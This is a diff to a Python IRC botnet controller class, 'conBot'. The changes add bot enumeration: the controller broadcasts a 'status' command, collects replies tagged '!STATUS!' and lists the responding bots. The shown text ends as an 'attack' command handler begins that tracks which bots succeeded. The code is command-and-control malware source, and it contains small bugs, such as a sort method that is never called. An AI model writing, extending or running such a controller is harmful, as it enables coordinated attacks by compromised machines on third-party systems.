@@ -58,22 +58,28 @@ class conBot:
 
     def handleResponse(self, prefix, text):
         print("from " + prefix + ": " + text)
+        if text.find("!STATUS!") != -1:
+            print("adding bot")
+            self.botList.append(text.split()[1]) 
 
     def reader(self):
         try:
             while True:
-                responses = self.getData()
-                for response in responses:
-                    if(response != ""):                                         
+                response = self.getData()
+                print(response)   
+                if(response != ""):                                         
                         if response.find("PRIVMSG") != -1:                           
                             name = response.split('!',1)[0][1:]
                             message = response.split('PRIVMSG',1)[1].split(':',1)[1]
-                            print("message from " + name + ": " + message)                                  
+                            print("message from " + name + ": " + message)   
+                            self.handleResponse(name, message)                              
                         elif response.find("PING") != -1:
-                            self.sendData("PONG {}: :\r\n".format(self.HOST).encode("utf-8"))                                                                          
+                            self.sendData("PONG {}: :\r\n".format(self.HOST))                                                                          
                         elif response.find('433') != -1:
                             self.createNick(self.NICK)
-                            self.connectIRC(self.s,self.NICK, self.chan)        
+                            self.connectIRC(self.s,self.NICK, self.chan)  
+                    
+     
         except Exception as e:
             print("Exception: ")
             print(e)
@@ -92,7 +98,11 @@ class conBot:
             self.sendCommand("#" + self.CHANNEL, self.PHRASE)
 
             if (self.command[0] == "status"):
+                self.botList = []
                 self.sendCommand("#" + self.CHANNEL, self.command[0])
+                time.sleep(5)
+                self.botList.sort
+                print("Found {} bots: {}".format(str(len(self.botList)),','.join(self.botList)))
             elif (self.command[0] == "attack"):
                 if (len(self.command) == 3):
                     self.botsSuccessful = []
